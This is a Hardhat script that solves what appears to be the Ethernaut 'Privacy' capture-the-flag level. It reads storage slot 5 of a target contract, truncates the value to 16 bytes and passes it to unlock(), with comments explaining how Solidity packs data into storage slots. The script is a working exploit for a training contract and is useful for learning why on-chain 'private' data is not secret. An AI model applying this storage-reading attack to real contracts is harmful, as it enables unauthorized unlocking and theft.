import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/12.Privacy/Privacy.sol/Privacy.json";
import { Contract } from "ethers";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0x83DdFB34cCAd0b38b2F1415D201A937D724E84ce";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);

  const slot5 = await ethers.provider.getStorageAt(target.address, "0x5");
  const key = slot5.slice(0, 34);
  const tx = await target.connect(attacker).unlock(key);
  await tx.wait();
  const isLocked = !!(await attacker.provider!.getStorageAt(
    target.address,
    "0x0"
  ));
  displayResult(isLocked);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// explanation:
// Data is stored in 256 bit slots. But to avoid loss of space, data is sometimes
// packed.
// In this case the data is organised this way :
// slot[0] = 0x0000000000000000000000000000000000000000000000000000000000000000
// --> locked variable
// slot[1] = 0x0000000000000000000000000000000000000000000000000000000062bcd019
// --> ID variable
// slot[2] = 0x00000000000000000000000000000000000000000000000000000000d019ff0a
// --> 0a = 10 = flattening variable
// --> ff = 255 = denomination
// --> d019 = 53407 = uint16(now)
// slot[3] = data[0]
// slot[4] = data[1]
// slot[5] = data[2]
// So solution is bytes16(slot[5])
